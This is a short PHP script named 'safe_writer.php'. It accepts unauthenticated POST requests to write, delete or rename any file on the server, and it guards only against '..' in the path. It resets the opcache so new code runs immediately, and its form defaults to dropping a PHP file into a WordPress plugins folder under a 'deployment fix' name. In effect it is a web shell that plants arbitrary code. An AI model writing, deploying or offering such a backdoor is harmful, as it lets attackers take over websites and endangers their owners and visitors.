<?php
// safe_writer.php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $action = isset($_POST['action']) ? $_POST['action'] : 'write';
    $path = $_POST['path'];
    
    // Security check
    if (strpos($path, '..') !== false) die("Security error");
    
    $result = "";
    if ($action === 'delete') {
        if (file_exists($path)) {
            if (unlink($path)) $result = "SUCCESS: Deleted $path";
            else $result = "FAILURE: Could not delete $path";
        } else {
            $result = "NOT FOUND: $path";
        }
    } elseif ($action === 'rename') {
        $new_path = $_POST['new_path'];
        if (strpos($new_path, '..') !== false) die("Security error");
        if (rename($path, $new_path)) $result = "SUCCESS: Renamed $path to $new_path";
        else $result = "FAILURE: Could not rename $path";
    } else {
        $content = $_POST['content'];
        $dir = dirname($path);
        if (!is_dir($dir)) mkdir($dir, 0755, true);
        if (file_put_contents($path, $content)) $result = "SUCCESS: Wrote to $path";
        else $result = "FAILURE: Could not write to $path";
    }
    
    if (function_exists('opcache_reset')) {
        opcache_reset();
        $result .= " (Opcache reset)";
    }
    echo $result;
    exit;
}
?>
<form method="POST">
    Path: <input type="text" name="path" value="wp-content/plugins/esm-deployment-fix.php"><br>
    Content: <textarea name="content" rows="20" cols="80"></textarea><br>
    <input type="submit" value="Write File">
</form>
